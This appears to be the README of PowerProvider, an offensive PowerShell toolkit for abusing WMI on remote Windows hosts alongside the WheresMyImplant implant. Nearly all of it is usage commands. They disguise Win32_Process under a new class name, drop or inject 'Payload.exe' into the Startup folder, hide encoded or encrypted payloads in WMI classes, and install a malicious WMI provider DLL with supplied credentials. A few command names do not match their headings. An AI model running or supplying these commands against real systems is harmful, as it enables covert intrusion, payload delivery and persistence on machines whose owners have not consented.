## PowerProvider

PowerProvider: A toolkit to manipulate WMI. This toolkit provides functionality to:
* Duplicate Classes
* Create static classes for file storage
* Remote Install WMI Providers

Primarily used in conjunction with WheresMyImplant - https://github.com/0xbadjuju/WheresMyImplant/

### Methods
#### Class Duplication
  * **Invoke-WMIDuplicateClass**
    * Invoke-WMIDuplicateClass -TargetClassName Win32_Process -DuplicateClassName Win32_Create -ComputerName $ComputerName -Credential $Credential

#### File Transfer
  * **Invoke-WMIUpload**
    * $Destination = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
    * Invoke-WMIUpload -PayloadPath C:\Payload.exe -Destination $Destination -PayloadName Payload.exe -ComputerName  $ComputerName -Credential $Credential
    * Invoke-WMIUpload -PayloadPath C:\Payload.exe -Inject -PayloadName Payload.exe -ComputerName  $ComputerName -Credential $Credential
  * **Invoke-WMIRemoteExtract**
    * $Destination = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
    * Invoke-WMIRemoteExtract -PayloadName Payload.exe -Destination $Destination -ComputerName  $ComputerName -Credential $Credential

#### File Storage
  * **New-WMIFSClass**
    * New-WMIFSClass -ComputerName $ComputerName -Credential $Credential
  * **ConvertTo-Base64**
    * $File = ConvertTo-Base64 -FileName C:\Payload.exe -Inject
  * **Invoke-InsertFileThreaded**
    * Invoke-InsertFileThreaded -EncodedText $File -FileName Payload.exe -ComputerName $ComputerName -Credential $Credential -Verbose
  * **Invoke-RetrieveFile**
    * $File = Invoke-RetrieveFile -FileName C:\Payload.exe -ComputerName $ComputerName -Credential $Credential
  * **ConvertFrom-Base64**
    * $FileBytes = ConvertFrom-Base64 -ComputerName $ComputerName -Credential $Credential
  * **ConvertTo-EncryptedText**
    * $EncryptedString = ConvertTo-EncryptedText -PlaintextString $File
  * **ConvertFrom-EncryptedText**
    * $File = ConvertFrom-EncryptedText -EncryptedString $EncryptedString
    
#### Provider Install
  * **Install-WMIProviderInstallUtil**
    * Install-WMIProviderInstallUtil -LibraryLocation C:\Windows\System32\wbem\WheresMysImplant.dll -ComputerName $ComputerName -Credential $Credential
  * **Install-WMIProviderPowerShell**
    * Install-WMIProviderPowerShell -LibraryLocation C:\Windows\System32\wbem\WheresMysImplant.dll -ComputerName $ComputerName -Credential $Credential
  * **Install-WMIProviderExtention**
    * Install-WMIProvider -LocalLibraryLocation C:\WheresMyImplant.dll -ComputerName $ComputerName -Credential $Credential
  * **Uninstall-WMIProviderExtention**
    * Uninstall-WMIProvider -ProviderName WheresMyImplant -ClassName Win32_Implant C:\WheresMy -ComputerName $ComputerName -Credential $Credential
